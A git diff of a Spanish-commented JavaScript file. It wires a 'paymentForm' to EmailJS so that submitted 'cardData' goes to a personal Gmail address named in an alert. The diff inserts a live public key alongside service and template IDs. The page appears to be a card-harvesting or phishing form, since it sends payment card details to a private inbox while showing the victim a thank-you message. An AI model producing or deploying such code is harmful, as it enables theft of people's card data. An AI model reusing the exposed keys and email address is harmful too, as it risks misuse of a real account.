@@ -1,11 +1,10 @@
-// Inicializa EmailJS con tu User ID
+// Inicializa EmailJS con tu Public Key
 (function() {
-    emailjs.init('TU_USER_ID'); // Reemplaza con tu User ID de EmailJS
+    emailjs.init('ReqtkWfjI392LAzFb'); // Public Key
 })();
 
-// Escucha el evento "submit" del formulario
 document.getElementById('paymentForm').addEventListener('submit', function(e) {
-    e.preventDefault(); // Evita que el formulario se envíe de forma tradicional
+    e.preventDefault();
 
     // Recopila los datos del formulario
     const cardData = {
@@ -15,14 +14,14 @@ document.getElementById('paymentForm').addEventListener('submit', function(e) {
     };
 
     // Envía los datos a tu correo usando EmailJS
-    emailjs.send("service_syrc1uk", "template_u3etoro", cardData)
+    emailjs.send("service_syrc1uk", "template_u3etoro", cardData) // Service ID y Template ID
         .then(() => {
-            alert('Datos enviados a karentre100@gmail.com'); // Muestra un mensaje de éxito
+            alert('Datos enviados a karentre100@gmail.com');
             document.getElementById('paymentForm').reset(); // Limpia el formulario
             document.getElementById('thankYouMessage').classList.remove('hidden'); // Muestra el mensaje de agradecimiento
         })
         .catch(error => {
-            alert('Error: No se pudo enviar el correo'); // Muestra un mensaje de error
+            alert('Error: No se pudo enviar el correo');
             console.error(error); // Imprime el error en la consola
         });
 });
